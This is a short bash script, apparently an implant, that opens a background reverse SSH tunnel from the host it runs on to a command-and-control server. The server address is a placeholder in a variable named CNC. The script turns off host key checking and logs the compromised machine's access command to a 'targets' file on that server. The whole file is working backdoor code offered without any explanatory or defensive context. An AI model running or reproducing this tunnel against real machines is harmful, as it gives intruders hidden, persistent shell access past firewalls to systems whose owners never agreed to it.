#!/bin/bash

CNC="test@test.com"

ssh -o BatchMode=yes -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -f -N -R $2:localhost:$1 $CNC 

if [ "$?" -eq 0 ]; then
  # Save command to access target on CNC server
  ssh $CNC "echo ssh -p $2 `hostname -s`@localhost >> ~/targets "
  exit 0
else
  echo connection failed
  exit 1
fi

